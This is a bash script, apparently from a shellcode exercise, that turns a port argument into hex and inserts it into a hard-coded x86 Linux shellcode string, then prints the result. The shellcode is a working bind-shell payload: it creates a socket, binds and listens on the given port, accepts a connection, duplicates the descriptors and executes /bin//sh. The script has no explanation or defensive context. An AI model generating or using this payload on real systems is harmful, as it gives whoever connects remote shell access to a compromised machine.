#!/bin/bash

port_hex=$(echo "obase=16; $1" | bc | sed 's/.\{2\}$/:&/')

port_hex1=$(echo $port_hex | awk  -F ':' '{print$2}')
port_hex2=$(echo $port_hex | awk  -F ':' '{print$1}')

echo $port_hex1
echo $port_hex2

shellcode="\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\xbb\x02\x00\x00\x00\x31\xd2\x52\x66\x68\x$port_hex2\x$port_hex1\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x50\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xd2\x52\x52\x57\x89\xe1\xb3\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xd2\x89\xd1\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80"

echo $shellcode
